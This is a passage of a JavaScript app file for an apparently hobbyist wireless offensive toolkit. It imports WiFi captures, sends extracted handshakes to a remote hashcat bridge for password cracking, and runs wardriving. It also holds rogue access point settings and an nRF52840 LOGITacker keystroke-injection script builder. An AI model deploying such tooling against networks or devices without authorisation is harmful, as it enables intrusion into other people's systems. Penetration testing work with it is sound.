    log('err', 'import: ' + e.message);
    renderImportResult();
  } finally {
    if (btn) btn.disabled = false;
  }
}

/**
 * Import bytes from anywhere — a picked file, or a capture shared in from another app.
 * One importer, so a shared capture cannot behave differently from a chosen one.
 */
async function onImportPickBytes(bytes, name) {
  log('ev', `import: reading ${name} (${fmtBytes(bytes.length)})`);
  try {
    const r = importCapture(bytes, name);

    for (const w of r.warnings) log('ev', 'import warning: ' + w);

    if (!r.handshakes.length && !r.chunks.length) {
      importedCapture = null;
      log('err', `import: nothing usable in ${name}`);
      return;
    }

    // A 22000 import carries no frames, so analyzeResult/analysisPlan are left alone:
    // there is nothing to analyze, and inventing targets would put fiction on the
    // screen. A capture with frames is analyzed like the Analyze step would, and the
    // plan is built from that result — `analyzeChunks` returns the RESULT (aps,
    // probes, clients), not a plan. Assigning it to `analysisPlan` directly left the
    // page with no `targets` and threw on `.length`.
    if (r.chunks.length) {
      analyzeResult = analyzeChunks(r.chunks);
      analysisPlan = plan(analyzeResult);
      log('ev', `import: ${analysisPlan.targets.length} target(s) in the file`);
    }
    importedCapture = { name, kind: r.kind, chunks: r.chunks, meta: r.meta, warnings: r.warnings };
    handshakeResult = { handshakes: r.handshakes, incomplete: r.incomplete, counts: r.counts };
    crackJob = null;

    log('ev', describeImport(r));
    for (const h of r.handshakes) {
      log('ev', `import: ${h.type} ${h.bssid} · ${h.essid || '(hidden)'} · ${(h.messages || []).join('+')}`);
    }

    // Keep it with the other hashes so it survives a reload.
    if (window.HashStore) {
      for (const h of r.handshakes) {
        window.HashStore.addHash(h.line, h.bssid, h.essid || '', null, null, null, null);
      }
    }
  } catch (e) {
    importedCapture = null;
    log('err', 'import: ' + e.message);
  } finally {
    renderImportResult();
    revealCrackAfterImport();
  }
}

/** Pick up a capture another app shared in (Android's "Share → Xixchil"). */
async function checkSharedCapture() {
  try {
    return await takeSharedCapture(({ name, bytes }) => {
      log('ev', `import: received ${name} from another app`);
      onImportPickBytes(bytes, name);
    });
  } catch (e) {
    log('err', 'import: ' + e.message);
    return false;
  }
}

/** The imported-hash list and the way into the crack stage. */
function renderImportResult() {
  const el = $('#importResult');
  if (!el) return;
  const ic = importedCapture;
  const hs = handshakeResult?.handshakes || [];
  if (!ic && !hs.length) { el.innerHTML = ''; return; }

  const rows = hs.map((h) => `
    <div style="display:flex;gap:8px;align-items:baseline;font-size:12px;padding:4px 0;border-top:1px solid var(--line)">
      <span style="font-variant-numeric:tabular-nums;color:var(--muted)">${escapeHtml(h.bssid)}</span>
      <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(h.essid || '(hidden)')}</span>
      <span style="color:var(--accent)">${escapeHtml(h.type)}</span>
    </div>`).join('');

  // Every value below is attacker-supplied — an SSID is a string someone else chose,
  // and it arrives from a file rather than from us. All of it goes through escapeHtml;
  // the only unescaped text is our own markup and Icon()'s own SVG.
  el.innerHTML = `
    <div style="margin-top:10px;font-size:12.5px">
      ${Icon('check', { size: 15 })} ${hs.length} handshake(s)${ic ? ` from ${escapeHtml(ic.name)}` : ''}
      ${ic?.meta?.truncated ? ' · file was truncated' : ''}
    </div>
    ${rows}
    ${hs.length ? `<button class="block primary" id="importCrack" style="margin-top:10px">
      ${Icon('key', { size: 18 })}Crack on the bridge</button>` : ''}
  `;
  // The strategy pickers and live progress already live in the attack stage, so
  // this opens that rather than growing a second copy of the crack UI here.
  $('#importCrack')?.addEventListener('click', revealCrackAfterImport);
}

/** After an import that really did contain a handshake, go where the handshake is
 *  worth anything: the Crack page, which lists what came out of the file and offers
 *  the search on the bridge. Cracking an imported file needs no board — the phone
 *  extracts and the bridge searches — so this does not wait for a device.
 *
 *  This used to unhide the Capture page's flow cards and set `state.stage = 'attack'`.
 *  The cards are already revealed by the observer on #consoleCard, and 'attack' is
 *  a stage nothing owns any more — the Capture panel resets anything that is not
 *  'capture' to 'capture' before it paints, so the import repainted the Capture
 *  step and left the operator with no on-screen route to the handshake they had
 *  just imported.
 */
function revealCrackAfterImport() {
  if (!handshakeResult?.handshakes?.length) return;
  setPage('crack');
}

async function onCrackRun() {
  if (!handshakeResult?.handshakes?.length) return;
  const cfg = bridgeConfig();
  if (!cfg.url) { log('err', 'crack: no bridge URL set'); return; }

  // Acquire screen wake lock to prevent Android doze during crack
  let wakeLock = null;
  try { wakeLock = await navigator.wakeLock.request('screen'); } catch {}

  crackRunning = true;
  crackJob = { state: 'submitting', job_id: '' };
  refreshPanels();

  const cs = crackStrategy();
  const steps = [];
  // Build the chain of attack steps
  if (cs.mode === 'dictionary' || cs.mode === 'both' || (cs.mode === 'mask' && cs.chain)) {
    steps.push({ mode: 'dictionary', wordlist: cs.wordlist, rules: cs.rules, label: `${cs.wordlist} + ${cs.rules === 'none' ? 'no rules' : cs.rules}` });
  }
  if (cs.mode === 'mask' || cs.chain) {
    steps.push({ mode: 'mask', mask: cs.mask, label: `mask ${cs.mask}` });
  }

  let finalResult = null;
  for (let i = 0; i < steps.length; i++) {
    const step = steps[i];
    const stepLabel = `[${i + 1}/${steps.length}] ${step.label}`;
    crackJob = { state: `dictionary`, step: stepLabel, job_id: crackJob?.job_id || '' };
    refreshPanels();

    try {
      log('ev', `crack: starting step ${stepLabel}`);
      const out = await bridgeClient().crack({
        hashes: hashFile(handshakeResult.handshakes),
        wordlist: step.wordlist || undefined,
        rules: step.rules !== 'none' ? step.rules : undefined,
        attack_mode: step.mode === 'mask' ? 3 : 0,
        mask: step.mask,
        onProgress: (s) => {
          crackJob = { ...s, step: stepLabel, job_id: crackJob?.job_id || s.job_id || '' };
          refreshPanels();
        },
      });

      if (out.state === 'cracked') {
        finalResult = { ...out, step: stepLabel };
        log('ev', `CRACKED (${stepLabel}): passphrase recovered`);
        break; // Done — chain stops on success
      }

      log('ev', `crack step exhausted: ${stepLabel} — ${out.state}`);
      finalResult = { ...out, step: stepLabel };

    } catch (e) {
      finalResult = { state: 'failed', done: true, error: e.message, step: stepLabel };
      log('err', `crack step ${stepLabel}: ${e.message}`);
      break; // On error, stop the chain
    }
  }

  crackRunning = false;
  if (finalResult) {
    crackJob = { ...finalResult, done: true, step: finalResult.step || '' };
    if (finalResult.state === 'cracked') {
      log('ev', `CRACKED: ${finalResult.password}`);
    } else {
      log('ev', `crack finished: ${finalResult.state}`);
    }
  }
  // Release wake lock — crack done, phone can sleep again
  if (wakeLock) { try { wakeLock.release(); } catch {} }
  refreshPanels();
}

// ── wardrive visibility ─────────────────────────────────────────────────────────────

/** True while wardrive mode is armed or capturing. A wardrive session is capture
 *  + GPS + hash storage, all of it on the phone — the crack bridge has no part in
 *  it, so every bridge call in the app is gated on this being false. */
let wardriveModeOn = false;
function wardriveActive() {
  if (wardriveModeOn) return true;
  const w = window.Wardrive;
  if (w && typeof w.isRunning === 'function' && w.isRunning()) return true;
  // Rule 22: guard the base, not the property — `capture` is null until boot wires it.
  const cap = capture || {};
  return !!(cap.running || cap.continuousRunning);
}

/** Match the wardrive button to whether the wardrive is actually running. Reads
 *  the engine, never sets it: opening the Wardrive view must not start one. */
function labelWardriveBtn() {
  const btn = document.getElementById('wardriveBtn');
  if (!btn) return;
  const w = window.Wardrive;
  if (w && w.isRunning()) {
    btn.textContent = 'Stop Wardrive';
    btn.className = 'danger';
  } else {
    btn.textContent = 'Start Wardrive';
    btn.className = '';
  }
}

/** Name wardrive as the open Capture view (true) or leave it (false).
 *
 *  This used to be the only thing that showed the wardrive card, because wardrive
 *  was step 4 of the bar. The Capture views own card visibility now, so this is a
 *  thin alias onto applyCaptureView() — kept for the boot call and for anything
 *  that still speaks in terms of "wardrive mode". It starts nothing. */
function toggleWardriveMode(on) {
  if (on) captureView = 'wardrive';
  else if (captureView === 'wardrive') captureView = 'packets';
  applyCaptureView();
}

// ── reset ──────────────────────────────────────────────────────────────────────
/** Full app reset — kills running operations, clears state, disconnects,
 *  and wipes app-persisted localStorage so the UI goes back to the
 *  device-selection screen. Leaves the token (bridgeToken, bridgeUrl) and
 *  bridge history intact — those aren't session state. */
function resetAll() {
  // Stop everything that could be running
  stopCapTicker();
  stopContTicker();
  if (capture.continuousRunning) {
    capture.continuousRunning = false;
  }
  if (capture.running) {
    capture.request('CAPTURE_STOP', undefined, { timeoutMs: 2000 }).catch(() => {});
  }
  if (window.Wardrive && window.Wardrive.isRunning()) {
    window.Wardrive.stop();
  }

  // Wipe session state from localStorage (keep bridge config & history)
  const keep = ['bridgeUrl', 'bridgeToken', BRIDGE_HISTORY_KEY, 'karmaChannel', 'karmaAllowlist',
    'karmaMode', 'manaChannel', 'manaSSIDs', 'manaInterval',
    'attackBssid', PRESETS_KEY, 'karmaPreset', 'manaPreset'];
  const saved = {};
  for (const k of keep) {
    const v = localStorage.getItem(k);
    if (v !== null) saved[k] = v;
  }
  localStorage.clear();
  for (const [k, v] of Object.entries(saved)) {
    localStorage.setItem(k, v);
  }

  // Disconnect from the board
  transport.disconnect().catch(() => {});
  setConnected(false);

  // Wipe in-memory state
  state.deviceInfo = null;
  state.stage = 'capture';
  captureView = 'packets';
  analysisView = 'observations';
  capture.writer = null;
  capture.saved = null;
  capture.stats = null;
  capture.running = false;
  capture.continuousRunning = false;
  capture._continuousDry = false;
  capture.continuousSegments = 0;
  capture.continuousPackets = 0;
  analyzeResult = null;
  analysisPlan = null;
  selectedTargetIndex = null;
  handshakeResult = null;
  bridgeStatus = null;
  bridgeError = null;
  crackJob = null;
  crackRunning = false;
  txResult = null;
  txRunning = false;
  karmaRunning = false;
  karmaResult = null;
  manaRunning = false;
  manaResult = null;

  // Re-render everything
  applyCaptureView();
  refreshPanels();
  log('ev', 'app reset');
}

// ── boot ──────────────────────────────────────────────────────────────────────

// ── pages ────────────────────────────────────────────────────────────────────
//
// The app was one long scroll: every card, every panel, all on one page. On a
// phone that means whatever you want is always further down than what you are
// looking at, and two unrelated radios — WiFi and nRF24 — sat in the same column
// as the handshake importer. So the shell is now a hub plus five sections; the
// markup for them lives in index.html and the bar below is built from this list.
//
// A page cannot exist without a tab (or it is unreachable) and a tab cannot point
// at a page that is not there — that pairing is the list, not two lists.
const PAGE_TABS = [
  { id: 'home',     label: 'Home',     icon: 'home'     },
  { id: 'capture',  label: 'Capture',  icon: 'capture'  },
  { id: 'analysis', label: 'Analysis', icon: 'analyze'  },
  { id: 'attacks',  label: 'Attacks',  icon: 'attack'   },
  { id: 'crack',    label: 'Crack',    icon: 'key'      },
];
const PAGE_KEY = 'xixchil-page';

/** Real pages that no tab points at, reached from the header instead: Logs and
 *  Settings. They are exempt from the "every page has a tab" rule for that
 *  reason, and nothing else is — the list is the exemption, so a third one is a
 *  one-line change rather than three. */
const HEADER_PAGES = ['logs', 'settings'];

/** Capture's three views. Independent of each other: opening one only decides
 *  what is on screen. Selecting a view must never start a capture, a sweep or a
 *  wardrive — every start in this app is a button the operator presses. */
const CAPTURE_VIEWS = [
  { id: 'packets',  label: 'Packets',  icon: 'capture' },
  { id: 'channels', label: 'Channels', icon: 'signal'  },
  { id: 'wardrive', label: 'Wardrive', icon: 'scan'    },
];
let captureView = 'packets';

/** Analysis' two views over one subject. They keep their own modules and their
 *  own data: Observations is analyze.js (what is on the air), Assessment is
 *  analysis.js (what to do about it). Only the labels are new. */
const ANALYSIS_VIEWS = [
  { id: 'observations', label: 'Observations', icon: 'analyze'  },
  { id: 'assessment',   label: 'Assessment',   icon: 'analysis' },
];
let analysisView = 'observations';

/** The tunnel the bridge is reached over, when it is not on the local network.
 *  Named here so the launcher call and the manifest's <queries> entry cannot drift. */
const TAILSCALE_PKG = 'com.tailscale.ipn';

/** The last section you were on, ignoring Settings — so the gear can put you back. */
let lastSection = 'home';

/** Show one page and repaint what it owns.
 *
 *  `logs` and `settings` are reached from the header rather than the bar. They are
 *  still pages, so they go through here — and because no tab is "the page you are
 *  on" while one of them is open, the tab you came from stays lit (`.origin`) and
 *  both header buttons toggle back to it. */
function setPage(id) {
  if (!PAGE_TABS.some((t) => t.id === id) && !HEADER_PAGES.includes(id)) id = 'home';
  if (!HEADER_PAGES.includes(id)) lastSection = id;
  try { localStorage.setItem(PAGE_KEY, id); } catch (e) {}
  document.querySelectorAll('.page').forEach((p) => p.classList.toggle('active', p.id === 'page-' + id));
  const cameFrom = HEADER_PAGES.includes(id) ? lastSection : null;
  document.querySelectorAll('#tabbar .tab').forEach((t) => {
    const on = t.dataset.page === id;
    t.classList.toggle('active', on);
    t.setAttribute('aria-selected', String(on));
    t.classList.toggle('origin', !on && t.dataset.page === cameFrom);
  });
  $('#gearBtn')?.classList.toggle('on', id === 'settings');
  $('#logsBtn')?.classList.toggle('on', id === 'logs');
  renderPage(id);
}

function renderPage(id) {
  if (id === 'home')           renderHub();
  else if (id === 'capture') { applyCaptureView(); renderAnalyzerCard(); }
  else if (id === 'analysis')  applyAnalysisView();
  else if (id === 'attacks')   renderAttackPanel($('#attackPanel'), { exclude: 'crack' });
  else if (id === 'crack')     renderCrackPanel();
  else if (id === 'settings')  renderSettingsPanel();
}

// Every state change repaints every panel. Cheap (they are string builds) and it
// removes a whole class of bug: a panel that was correct when the state changed
// and stale by the time you looked at it. The flag is insurance — a repaint that
// re-enters itself would spin forever on the phone.
let refreshing = false;
function refreshPanels() {
  if (refreshing) return;
  refreshing = true;
  try {
    renderHub();
    renderStagePanel();
    renderAnalysisHost();
    renderAnalyzerCard();
    renderAttackPanel($('#attackPanel'), { exclude: 'crack' });
    renderCrackPanel();
  } finally {
    refreshing = false;
  }
}

/** Home. Two things only: what is connected, and where to go next.
 *
 *  It used to carry three navigation surfaces — a chip row, a module grid and the
 *  tabbar — and between them the chips and the grid pointed at the same two pages.
 *  The chips are gone and the grid is one status list; the tabbar stays, because
 *  it is for switching while you are already working somewhere.
 *
 *  The board is deliberately not a row in that list: the Device/Link card above it
 *  is the board, and the old "Board" tile pointed at the page you were already on.
 */
function renderHub() {
  const card = $('#hubCard'), list = $('#hubModules'), bridge = $('#bridgeHome');
  if (!card || !list || !bridge) return;
  card.classList.remove('hidden');

  const all = attackList(attackContext());
  const ready = all.filter((x) => x.ready).length;
  const chunks = capture?.writer?.chunks?.length || 0;
  const capLine = capture?.running ? `capturing · ${chunks} chunk(s)`
    : chunks ? `${chunks} chunk(s) buffered` : 'idle';
  const dongleLine = ($('#dongleStatus')?.textContent || 'not connected').trim();
  const wardriving = !!wardriveActive();
  const hs = handshakeResult?.handshakes?.length || 0;
  const logLines = logEl()?.childElementCount || 0;
  // A target only carries a rank if it was attackable and scored, so counting
  // ranks is the honest number here — `targets.length` includes the context rows.
  const ranked = (analysisPlan?.targets || []).filter((t) => t.rank).length;
  const analysisLine = analysisPlan ? `${ranked} target(s) ranked`
    : analyzeResult ? 'observations ready' : 'nothing read yet';

  // Every row is a whole button, and every row lands on its page. `scroll` names the
  // thing on that page the row is talking about, so "Dongle — not connected" opens
  // Attacks at the dongle rather than at the top. `view` names the view when the
  // thing lives inside one — the wardrive card only exists in Capture's Wardrive
  // view, so a row that jumped to the page without the view would land on nothing.
  const rows = [
    { page: 'capture', icon: 'capture',  name: 'Capture',  sub: capLine,
      on: !!capture?.running },
    { page: 'analysis', icon: 'analyze', name: 'Analysis', sub: analysisLine,
      on: !!analysisPlan },
    { page: 'capture', icon: 'scan',     name: 'Wardrive', sub: wardriving ? 'running' : 'idle',
      on: wardriving, view: 'wardrive', scroll: 'wardriveCard' },
    { page: 'attacks', icon: 'attack',   name: 'Attacks',  sub: `${ready} of ${all.length} ready`,
      on: ready > 0 },
    { page: 'attacks', icon: 'plug',     name: 'Dongle',   sub: dongleLine,
      on: dongleLine.startsWith('linked'), scroll: 'dongleCard' },
    { page: 'crack',   icon: 'key',      name: 'Crack',
      sub: hs ? `${hs} handshake(s) to search` : 'nothing extracted yet', on: !!hs },
    { page: 'logs',    icon: 'terminal', name: 'Logs',     sub: `${logLines} line(s)`,
      on: false },
  ];
  list.innerHTML = rows.map((r) => `
    <button class="srow${r.on ? ' on' : ''}" data-page="${r.page}"${r.view ? ` data-capture-view="${r.view}"` : ''}${r.scroll ? ` data-scroll="${r.scroll}"` : ''}>
      <span class="sicon">${Icon(r.icon, { size: 17 })}</span>
      <span class="sname">${escapeHtml(r.name)}</span>
      <span class="ssub">${escapeHtml(r.sub)}</span>
      <span class="schev">${Icon('chevron', { size: 14 })}</span>
    </button>`).join('');

  bridge.innerHTML = bridgeHomeHtml();
  // Scoped to the card: a bare $('#…') would reach the Settings page's copy of a
  // control with the same name first and leave this one dead.
  bridge.querySelector('#brHomeTest')?.addEventListener('click', onBridgeTest);
  bridge.querySelector('#brHomeOpen')?.addEventListener('click', () => setPage('settings'));
  bridge.querySelector('#tsOpen')?.addEventListener('click', onOpenTailscale);
}

/** The bridge on Home: where it is, whether it answers, what it would search with.
 *
 *  Read-only by design — the URL and the token are set once and left alone, so they
 *  live in Settings and this card never carries a credential. It used to be that
 *  the only way to see the bridge was to open the Crack page, which is the page you
 *  go to when you already intend to crack something.
 */
function bridgeHomeHtml() {
  const cfg = bridgeConfig();
  let host = cfg.url || 'no address set';
  try { if (cfg.url) host = new URL(cfg.url).host; } catch (e) { /* show it as typed */ }
  const dot = bridgeStatus?.ok ? 'on' : bridgeError ? 'bad' : '';
  const line = bridgeStatus?.ok
    ? `hashcat ${bridgeStatus.hashcat || '?'} · mode ${bridgeStatus.mode || '?'} · queued ${bridgeStatus.queued ?? 0}`
    : bridgeError ? 'unreachable' : 'not tested yet';
  return `
    <div class="brow">
      <span class="bdot ${dot}"></span>
      <span class="bhost">${escapeHtml(host)}</span>
      <span class="bsub">${escapeHtml(line)}</span>
    </div>
    ${cfg.token ? '' : '<div class="pnlnote" style="margin:9px 0 0">No token set — the bridge '
      + 'needs one before it will search anything. Add it in Settings.</div>'}
    ${bridgeError ? `<div class="finding high" style="margin-top:9px"><div class="ftitle">`
      + `${Icon('alert', { size: 15 })}Bridge unreachable</div>`
      + `<div class="fdetail">${escapeHtml(bridgeError)}</div></div>` : ''}
    <div class="row" style="margin-top:10px">
      <button id="brHomeTest" class="ghost">${Icon('link', { size: 17 })}Test bridge now</button>
      <button id="brHomeOpen" class="ghost">${Icon('gear', { size: 17 })}Bridge settings</button>
    </div>
    ${tailscaleRowHtml()}`;
}

/** Tailscale is the tunnel the bridge is reached over, so it sits under the bridge
 *  line rather than in a card of its own.
 *
 *  Their app exposes no public connect action — a third-party app cannot turn the
 *  tunnel on — so this says "open", honestly, and the bridge dot above is what tells
 *  you whether the tunnel came up. */
function tailscaleRowHtml() {
  return `
    <button class="srow tsrow" id="tsOpen">
      <span class="sicon">${Icon('link', { size: 17 })}</span>
      <span class="sname">Tailscale</span>
      <span class="ssub">open the tunnel app</span>
      <span class="schev">${Icon('chevron', { size: 14 })}</span>
    </button>`;
}

/** Open another app on the phone. A plugin call rather than a web intent: Android
 *  11+ filters getLaunchIntentForPackage unless the package is named in <queries>,
 *  and the plugin is the only thing here that can start an activity. */
async function onOpenTailscale() {
  const launcher = window.Capacitor?.Plugins?.AppLauncher;
  if (!launcher) {
    log('err', 'tailscale: no launcher in this build — only the Android app can open it');
    return;
  }
  try {
    await launcher.open({ package: TAILSCALE_PKG });
    log('ev', 'tailscale: opened — the bridge dot is what says whether it came up');
  } catch (e) {
    log('err', 'tailscale: ' + (e?.message || e));
  }
}

/** The Crack page draws the same attack card, narrowed to the one attack. */
function renderCrackPanel() {
  renderAttackPanel($('#crackPanel'), {
    only: 'crack',
    head: {
      icon: 'key',
      name: 'Password cracking',
      sub: 'Take a captured handshake apart and search a wordlist for the passphrase. The phone ' +
           'extracts; the GPU box searches.',
    },
  });
}

/** The channel analyzer: a listening tool, so it lives on Capture, not Attacks. */
function renderAnalyzerCard() {
  const box = $('#analyzerPanel');
  if (!box) return;
  box.innerHTML = `
    <div class="pnlnote">Sweeps channels 1–11 and counts packets per channel, so a capture can be
      given a quiet one.</div>
    ${analyzerResult && !analyzerRunning ? analyzerResultHtml(analyzerResult) : ''}
    <div class="row" style="margin-top:6px">
      <button id="anScan" class="primary" ${analyzerRunning ? 'disabled' : ''}>
        ${Icon('scan', { size: 16 })}${analyzerRunning
          ? `Scanning (${analyzerResult?.currentChannel ? analyzerResult.currentChannel + '/11' : '0/11'})`
          : 'Scan channels'}
      </button>
      ${analyzerRunning ? `<button id="anStop" class="ghost" style="font-size:12px">${Icon('stop', { size: 14 })}Stop</button>` : ''}
    </div>`;
  $('#anScan')?.addEventListener('click', onAnalyzerScan);
  $('#anStop')?.addEventListener('click', onAnalyzerStop);
}

// ── settings: the bridge ─────────────────────────────────────────────────────
//
// Set once and left alone, so it does not belong in the middle of a working page.
// The ids are the ones the old attack panel used, so nothing about the bridge
// itself changed — only where it is configured, and both pages that need the
// bridge link here rather than each carrying their own copy.

function bridgeConfigHtml() {
  const cfg = bridgeConfig();
  return `
    <div class="sechead">${Icon('link', { size: 16 })} Crack bridge</div>
    <div class="pnlnote">The search runs on the GPU box, not on this phone — this phone extracts
      the handshake, the bridge searches the wordlist.</div>
    <div class="fields">
      <label class="field">
        <span>Bridge URL</span>
        <input id="brUrl" type="url" inputmode="url" autocapitalize="off" spellcheck="false"
               value="${escapeHtml(cfg.url)}" placeholder="${escapeHtml(BRIDGE_DEFAULT_URL)}">
        <select id="brUrlSelect" style="margin-top:4px;font-size:12px;width:100%">
          <option value="">${bridgeUrlHistory().length ? '— past URLs —' : '— no history yet —'}</option>
          ${bridgeUrlHistory().map((u) => `<option value="${escapeHtml(u)}">${escapeHtml(u)}</option>`).join('')}
        </select>
      </label>
      <label class="field">
        <span>Token</span>
        <input id="brToken" type="password" autocapitalize="off" spellcheck="false"
               value="${escapeHtml(cfg.token)}" placeholder="from ~/projects/crackbridge/token">
      </label>
    </div>
    <div class="row">
      <button id="brTest" class="ghost">${Icon('link', { size: 18 })}Test connection</button>
    </div>
    <div id="brState">${bridgeStateHtml()}</div>`;
}

function renderSettingsPanel() {
  const box = $('#settingsPanel');
  if (!box) return;
  box.innerHTML = bridgeConfigHtml();
  wireBridgeConfig();
}

function wireBridgeConfig() {
  // Scoped to the Settings panel, like every other panel's wiring. The Crack page's
  // card carries a "Test bridge now" button of its own under the same id (#brTest),
  // and it is drawn earlier in the document — so a document-wide $('#brTest') here
  // bound the Settings button's listener to the Crack page's copy and left the button
  // on this page dead.
  const box = $('#settingsPanel');
  if (!box) return;
  const $s = (sel) => box.querySelector(sel);
  $s('#brUrl')?.addEventListener('change', (e) => {
    saveBridgeUrl(e.target.value);
    localStorage.setItem('bridgeUrl', e.target.value.trim());
    bridgeStatus = null; bridgeError = null;
    renderSettingsPanel(); refreshPanels();
  });
  $s('#brUrlSelect')?.addEventListener('change', (e) => {
    const val = e.target.value;
    if (!val) return;
    const input = $s('#brUrl');
    if (input) input.value = val;
    saveBridgeUrl(val);
    localStorage.setItem('bridgeUrl', val.trim());
    e.target.value = '';
    bridgeStatus = null; bridgeError = null;
    renderSettingsPanel(); refreshPanels();
  });
  $s('#brToken')?.addEventListener('change', (e) => {
    localStorage.setItem('bridgeToken', e.target.value.trim());
    bridgeStatus = null; bridgeError = null;
    renderSettingsPanel(); refreshPanels();
  });
  $s('#brTest')?.addEventListener('click', onBridgeTest);
}

/** The quick scan: ask the linked dongle what it can hear, in one tap.
 *
 *  If nothing is linked this says so instead of quietly logging a command that
 *  cannot work — the old behaviour looked identical to a successful send. */
async function onDongleQuickScan() {
  const btn = $('#dongleQuickScan');
  const rest = () => { if (btn) { btn.disabled = false; btn.innerHTML = Icon('scan', { size: 18 }) + 'Scan what it hears'; } };
  // One tap means one tap: find the dongle and link it first if nobody has yet.
  if (!dongleLinked()) {
    dlog('nothing linked yet — looking for the dongle first');
    await dongleScan();
  }
  if (!dongleLinked()) {
    // Say it where he is looking. This is the button he taps when nothing happens,
    // so it has to be the thing that explains itself — a log line under the fold
    // is indistinguishable from a dead button.
    renderDongleTable([], 'No dongle linked — plug the nRF52840 into the phone, then tap Find dongle.');
    dlog('not linked — no dongle on the USB port');
    return;
  }
  if (btn) { btn.disabled = true; btn.innerHTML = Icon('scan', { size: 18 }) + 'Listening…'; }
  dlog('listening…');
  try { await dongleDevices(); } finally { rest(); }
}

function boot() {
  $('#connPill').innerHTML = '<span class="dot"></span>offline';
  $('#refreshBtn').innerHTML = Icon('refresh', { size: 18 }) + 'Scan';
  $('#linkBtn').innerHTML = Icon('unlink', { size: 18 }) + 'Disconnect';
  // Every button in index.html starts as an empty <button> and gets its label
  // here — this one was missing, so it shipped as a blank rectangle. The label
  // is load-bearing: nothing else names the control. Guarded by verify_ui.mjs.
  $('#pingBtn').innerHTML = Icon('plug', { size: 18 }) + 'Ping';
  $('#connectCard').querySelector('h2').textContent = 'Device';

  $('#refreshBtn').addEventListener('click', refreshDevices);
  $('#pingBtn').addEventListener('click', ping);
  $('#linkBtn').addEventListener('click', async () => {
    await transport.disconnect();
    setConnected(false);
  });
  $('#resetBtn')?.addEventListener('click', resetAll);

  // ── import ──────────────────────────────────────────────────────────────────
  // Label set here like every other button in this file (index.html ships them
  // empty; verify_ui.mjs fails on a blank one).
  $('#importBtn').innerHTML = Icon('save', { size: 18 }) + 'Choose file…';
  $('#importBtn').addEventListener('click', () => $('#importFile').click());

  // ── dongle lane (nRF52840 / LOGITacker) ─────────────────────────────────────
  // Labels live here like every other button: index.html ships them empty and
  // verify_ui.mjs fails on a blank one.
  $('#gearBtn').innerHTML      = Icon('gear', { size: 12 });
  // Logs moved off the bar and into the header, next to the gear. Empty like the
  // rest of index.html's buttons, so it is labelled here and verify_ui.mjs checks it.
  $('#logsBtn').innerHTML      = Icon('terminal', { size: 12 });
  $('#dongleScan').innerHTML     = Icon('refresh', { size: 18 }) + 'Find dongle';
  $('#dongleQuickScan').innerHTML = Icon('scan', { size: 18 }) + 'Scan what it hears';
  $('#dongleSend').innerHTML     = Icon('chevron', { size: 18 }) + 'Send';
  $('#mjScriptString').innerHTML = Icon('plug', { size: 18 }) + 'Write text';
  $('#mjScriptPress').innerHTML  = Icon('plug', { size: 18 }) + 'Key combo';
  $('#mjScriptDelay').innerHTML  = Icon('plug', { size: 18 }) + 'Delay';
  $('#mjScriptShow').innerHTML   = Icon('save', { size: 18 }) + 'Show script';
  $('#mjScriptStore').innerHTML  = Icon('save', { size: 18 }) + 'Save to flash';
  $('#mjScriptBuild').innerHTML  = Icon('chevron', { size: 18 }) + 'Rebuild';
  $('#mjScriptClear').innerHTML  = Icon('unlink', { size: 18 }) + 'Start fresh';

  $('#dongleScan').addEventListener('click', dongleScan);
  $('#dongleQuickScan').addEventListener('click', onDongleQuickScan);
  $('#dongleSend').addEventListener('click', () => {
    const c = $('#dongleCmd').value.trim();
    if (c) dongleRun(c);
  });
  $('#dongleCmd').addEventListener('keydown', (e) => {
    if (e.key !== 'Enter') return;
    const c = $('#dongleCmd').value.trim();
    if (c) { e.preventDefault(); dongleRun(c); }
  });
  // ── command picker ──────────────────────────────────────────────────────────
  // LOGITacker's command language is not something anyone carries in their head, and the
  // shell has no `help` to teach it, so the vocabulary lives in a dropdown. Picking one fills the box
  // below, which stays editable: the entries carry <placeholders> that have to be
  // replaced before sending, and nothing here invents a command that isn't in the
  // firmware's own documentation.
  const cmdPick = $('#dongleCmdPick');
  if (cmdPick) {
    cmdPick.innerHTML = '<option value="">Pick a command…</option>';
    const groups = new Map();
    for (const c of LOGITACKER_COMMANDS) {
      let og = groups.get(c.group);
      if (!og) { og = document.createElement('optgroup'); og.label = c.group; groups.set(c.group, og); cmdPick.appendChild(og); }
      const o = document.createElement('option');
      o.value = c.cmd;
      o.textContent = `${c.desc}  ·  ${c.cmd}`;   // what it does first — that's the part that helps
      og.appendChild(o);
    }
    cmdPick.addEventListener('change', () => {
      if (!cmdPick.value) return;
      $('#dongleCmd').value = cmdPick.value;
      cmdPick.selectedIndex = 0;                  // so the same one can be picked again
      $('#dongleCmd').focus();
    });
  }

  // Key names as autocomplete on the combo box rather than a wall of buttons.
  const keyList = $('#mjKeyList');
  if (keyList) keyList.innerHTML = PRESS_KEYS.map((k) => `<option value="${k}"></option>`).join('');

  // ── prebuilt scripts ────────────────────────────────────────────────────────
  const scriptPick = $('#mjScriptPick');
  if (scriptPick) {
    scriptPick.innerHTML = '<option value="">Pick a ready-made script…</option>';
    for (const s of PREBUILT_SCRIPTS) {
      const o = document.createElement('option');
      o.value = s.id;
      o.textContent = `${s.name} — ${s.desc}`;
      scriptPick.appendChild(o);
    }
    scriptPick.addEventListener('change', async () => {
      const s = PREBUILT_SCRIPTS.find((x) => x.id === scriptPick.value);
      scriptPick.selectedIndex = 0;
      if (s) await buildScript(s);
    });
  }
  $('#mjScriptBuild').addEventListener('click', async () => {
    const s = PREBUILT_SCRIPTS.find((x) => x.id === lastScriptPick);
    if (s) await buildScript(s);
    else dlog('Pick a script from the list first.');
  });
  $('#mjScriptClear').addEventListener('click', async () => {
    const r = await dongleSession.scriptClear();
    dlog(`> script clear\n${(r.body || '').trim() || '(the script is now empty)'}`);
  });

  // The script subcommands build a keystroke-injection script on the dongle.
  // Note: this APPENDS to the script. Firing it at a target is a separate step,
  // and the command that does that has not been read off the shell yet — use the
  // raw command box for anything beyond these, rather than guessing a name.
  $('#mjScriptString').addEventListener('click', async () => {
    const text = $('#mjScriptText').value;
    if (!text) return;
    const r = await dongleSession.scriptString(text);
    dlog(`> script string …\n${r.body || '(appended)'}`);
    dongleSession.scriptShow().then((s) => dlog('script now:\n' + (s.body || '(empty)')));
  });
  $('#mjScriptPress').addEventListener('click', async () => {
    const keys = $('#mjScriptText').value.trim().split(/\s+/).filter(Boolean);
    if (!keys.length) return;
    const r = await dongleSession.scriptPress(keys);
    dlog(`> script press ${keys.join(' ')}\n${r.body || '(appended)'}`);
